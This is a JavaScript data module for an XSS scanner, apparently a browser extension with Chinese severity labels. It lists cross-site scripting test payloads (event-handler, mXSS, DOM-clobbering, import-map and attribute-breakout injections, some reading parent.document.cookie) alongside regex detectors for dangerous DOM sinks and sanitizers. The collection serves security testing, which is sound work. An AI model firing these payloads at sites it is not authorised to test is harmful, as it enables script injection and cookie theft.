// 灵眸 - XSS Scanner Data Tables
'use strict';

import { loadRemotePayloads } from './vk-payload-remote.js';

const XSS_SCAN_PAYLOADS = [
  { name: 'console.log', value: '<script>console.log(1)</script>' },
  { name: 'img onerror', value: '<img src=x onerror=console.log(1)>' },
  { name: 'svg onload', value: '<svg onload=console.log(1)>' },
  { name: 'body onload', value: '<body onload=console.log(1)>' },
  { name: 'svg script', value: '<svg><script>console.log(1)</script></svg>' },
  { name: 'details ontoggle', value: '<details open ontoggle=console.log(1)>' },
  { name: 'img src onerror', value: '<img src=1 onerror=console.log(1)>' },
  { name: 'input onfocus', value: '<input onfocus=console.log(1) autofocus>' },
  { name: 'marquee onstart', value: '<marquee onstart=console.log(1)>' },
  { name: 'select onchange', value: '<select onchange=console.log(1)><option>1</option></select>' },
  { name: 'textarea onfocus', value: '<textarea onfocus=console.log(1) autofocus>' },
  {
    name: 'keyframe anim',
    value:
      '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="console.log(1)">',
  },
  {
    name: 'math xss',
    value:
      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=console.log(1)>',
  },
  { name: 'h1 inject', value: '<h1>xss</h1>' },
  { name: 'a href js', value: '<a href="javascript:console.log(1)">click</a>' },
  { name: 'constructor', value: "''.constructor.constructor('console.log(1)')()" },
  { name: 'mXSS-SVG', value: '<svg><style></style><img src=x onerror=console.log(1)>' },
  {
    name: 'mXSS-Math',
    value: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=console.log(1)>',
  },
  {
    name: 'DOM-Clobber',
    value: '<form id=x><input name=y></form><img src=x onerror=console.log(x.y)>',
  },
  { name: 'Template-Literal', value: '`;console.log(1)//`' },
  {
    name: 'Import-Mapping',
    value:
      '<script type="importmap">{"imports":{"x":"data:text/javascript,console.log(1)"}}</script><script>import"x"</script>',
  },
];

const CONTEXT_PAYLOADS = {
  innerHTML: [
    '<img src=x onerror=console.log(1)>',
    '<svg onload=console.log(1)>',
    '<details open ontoggle=console.log(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=console.log(1)>',
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="console.log(1)">',
  ],
  outerHTML: [
    '<img src=x onerror=console.log(1)>',
    '<svg onload=console.log(1)>',
    '<details open ontoggle=console.log(1)>',
  ],
  documentWrite: [
    '<script>console.log(1)</script>',
    '<img src=x onerror=console.log(1)>',
    '<svg onload=console.log(1)>',
  ],
  eval: ['console.log(1)', "''.constructor.constructor('console.log(1)')()"],
  location: ['javascript:console.log(1)'],
  setTimeout: ['console.log(1)', "eval('console.log(1)')"],
  srcdoc: ['<script>console.log(1)</script>', '<img src=x onerror=console.log(1)>'],
  attribute: [
    '" onerror=console.log(1) ',
    '" onfocus=console.log(1) autofocus="',
    '" onmouseover=console.log(1) "',
    '" onfocus=console.log(1) autofocus="',
    "' onfocus=console.log(1) autofocus='",
    '` onfocus=console.log(1) autofocus=`',
  ],
  'script-src': [
    '";console.log(1)//',
    "';console.log(1)//",
    '</script><script>console.log(1)</script>',
  ],
  url: ['javascript:console.log(1)'],
  insertAdjacentHTML: [
    '<img src=x onerror=console.log(1)>',
    '<svg onload=console.log(1)>',
    '<details open ontoggle=console.log(1)>',
  ],
  createContextualFragment: [
    '<img src=x onerror=console.log(1)>',
    '<svg onload=console.log(1)>',
    '<details open ontoggle=console.log(1)>',
  ],
  scriptSrc: ['javascript:console.log(1)'],
  iframeWrite: [
    '<script>console.log(parent.document.cookie)</script>',
    '<img src=x onerror=console.log(parent.document.cookie)>',
  ],
};

const SINK_PATTERNS = [
  { context: 'innerHTML', regex: /\.innerHTML\s*=|\.innerHTML\s*\+/g, severity: 'high' },
  { context: 'outerHTML', regex: /\.outerHTML\s*=|\.outerHTML\s*\+/g, severity: 'high' },
  { context: 'documentWrite', regex: /document\.write\(|document\.writeln\(/g, severity: 'high' },
  { context: 'eval', regex: /\beval\s*\(|\bnew\s+Function\s*\(/g, severity: 'critical' },
  { context: 'setTimeout', regex: /setTimeout\s*\(\s*['"`]/g, severity: 'high' },
  { context: 'setInterval', regex: /setInterval\s*\(\s*['"`]/g, severity: 'high' },
  {
    context: 'location',
    regex: /(?:window\.)?location\s*[\.\[]|location\s*=\s*['"`]/g,
    severity: 'high',
  },
  { context: 'srcdoc', regex: /srcdoc\s*=\s*/g, severity: 'high' },
  {
    context: 'attribute',
    regex: /setAttribute\s*\(\s*['"`](?:on[a-z]+|href|src|action|style)['"`]/gi,
    severity: 'medium',
  },
  {
    context: 'url',
    regex: /(?:href|src|action)\s*=\s*(?:location|window\.location|document\.URL)/gi,
    severity: 'medium',
  },
  { context: 'eval', regex: /\bexecScript\s*\(/g, severity: 'critical' },
  { context: 'eval', regex: /\bFunction\s*\(\s*['"`]/g, severity: 'critical' },
  {
    context: 'innerHTML',
    regex:
      /(?:insertAdjacentHTML|\.append|\.before|\.after|\.insertBefore|\.replaceChildren)\s*\(/g,
    severity: 'medium',
  },
  {
    context: 'insertAdjacentHTML',
    regex: /insertAdjacentHTML\s*\(\s*['"`]/g,
    severity: 'high',
  },
  {
    context: 'createContextualFragment',
    regex: /createContextualFragment\s*\(/g,
    severity: 'high',
  },
  {
    context: 'scriptSrc',
    regex: /\.src\s*=\s*(?:location|document\.URL|window\.location|[^"'\s]*\+[^"'\s]*)/g,
    severity: 'critical',
  },
  {
    context: 'iframeWrite',
    regex: /(?:contentDocument|contentWindow\.document)\.write\s*\(/g,
    severity: 'critical',
  },
  {
    context: 'eval',
    regex: /(?:chrome\.runtime\.sendMessage|browser\.runtime\.sendMessage)\s*\(\s*\[\s*['"`]/g,
    severity: 'medium',
  },
  {
    context: 'location',
    regex: /(?:window\.)?open\s*\(\s*(?:location|document\.URL|window\.location)/g,
    severity: 'high',
  },
  {
    context: 'eval',
    regex: /import\s*\(\s*(?:location|document\.URL|\+)/g,
    severity: 'high',
  },
  {
    context: 'dom',
    regex: /\b(location|document\.location|window\.location)\s*[=+]/g,
    severity: 'high',
  },
  { context: 'dom', regex: /\bdocument\.write(ln)?\s*\(/g, severity: 'high' },
  { context: 'dom', regex: /\binnerHTML\s*[=+]/g, severity: 'medium' },
  { context: 'dom', regex: /\boutertext\s*[=+]/g, severity: 'medium' },
  { context: 'template', regex: /\{\{.*\}\}/g, severity: 'info' },
  { context: 'csp', regex: /script-src[^;]*/g, severity: 'info' },
];

const SANITIZER_PATTERNS = [
  { name: 'DOMPurify', regex: /DOMPurify\.sanitize/i, reduction: 5 },
  { name: 'Trusted Types', regex: /createPolicy|trustedTypes/i, reduction: 6 },
  { name: 'escapeHtml', regex: /escapeHtml|escapeXML|htmlEncode|sanitizeHtml/i, reduction: 3 },
  { name: 'textContent', regex: /\.textContent\s*=/, reduction: 4 },
  { name: 'innerText', regex: /\.innerText\s*=/, reduction: 3 },
  { name: 'encodeURIComponent', regex: /encodeURIComponent/i, reduction: 2 },
  { name: 'TextEncoder', regex: /new\s+TextEncoder/i, reduction: 2 },
  { name: 'JSON.stringify', regex: /JSON\.stringify/i, reduction: 1 },
  { name: 'parseInt/parseFloat', regex: /\b(?:parseInt|parseFloat)\s*\(/, reduction: 4 },
  { name: 'Number()', regex: /Number\s*\([^)]*\)/, reduction: 4 },
  { name: 'typeof check', regex: /typeof\s+\w+\s*===?\s*['"`](?:string|number)/, reduction: 3 },
  { name: 'CSP nonce', regex: /nonce[=:_-]/i, reduction: 3 },
  { name: 'Angular sanitization', regex: /\$sce|DomSanitizer|sanitize\.html/i, reduction: 5 },
  { name: 'Vue v-html', regex: /v-html/i, reduction: -2 },
  { name: 'Sanitizer API', regex: /new\s+Sanitizer\b/i, reduction: 4 },
  { name: 'URL validation', regex: /(?:new\s+URL|isURL|isValidUrl)\s*\(/, reduction: 2 },
  {
    name: 'innerHTML forbidden',
    regex: /trusted-types\s+[^\s;]*\s+[^;]*innerHTML/i,
    reduction: 5,
  },
];

const SEVERITY_CONFIG = {
  critical: { label: '严重', color: '#e74c3c', bg: '#fdecea', darkBg: 'rgba(231,76,60,0.15)' },
  high: { label: '高危', color: '#e67e22', bg: '#fef9e7', darkBg: 'rgba(230,126,34,0.15)' },
  medium: { label: '中危', color: '#f39c12', bg: '#fef9e7', darkBg: 'rgba(243,156,18,0.15)' },
  low: { label: '低危', color: '#27ae60', bg: '#e8f8f0', darkBg: 'rgba(39,174,96,0.15)' },
  info: { label: '信息', color: '#4A90E2', bg: '#eaf2fb', darkBg: 'rgba(74,144,226,0.15)' },
};

let _remoteScanPayloads = null;
let _remoteContextPayloads = null;
let _remoteSinkPatterns = null;
let _remoteSanitizerPatterns = null;

loadRemotePayloads(function (data) {
  if (!data || !data.payloads) return;
  if (data.payloads.xss_scan) _remoteScanPayloads = data.payloads.xss_scan;
  if (data.payloads.context_payloads) _remoteContextPayloads = data.payloads.context_payloads;
  if (data.payloads.sink_patterns) _remoteSinkPatterns = data.payloads.sink_patterns;
  if (data.payloads.sanitizer_patterns) _remoteSanitizerPatterns = data.payloads.sanitizer_patterns;
});

function getEffectiveScanPayloads() {
  return _remoteScanPayloads || XSS_SCAN_PAYLOADS;
}

function getEffectiveContextPayloads() {
  return _remoteContextPayloads || CONTEXT_PAYLOADS;
}

function getEffectiveSinkPatterns() {
  return _remoteSinkPatterns || SINK_PATTERNS;
}

function getEffectiveSanitizerPatterns() {
  return _remoteSanitizerPatterns || SANITIZER_PATTERNS;
}

export {
  XSS_SCAN_PAYLOADS,
  CONTEXT_PAYLOADS,
  SINK_PATTERNS,
  SANITIZER_PATTERNS,
  SEVERITY_CONFIG,
  getEffectiveScanPayloads,
  getEffectiveContextPayloads,
  getEffectiveSinkPatterns,
  getEffectiveSanitizerPatterns,
};
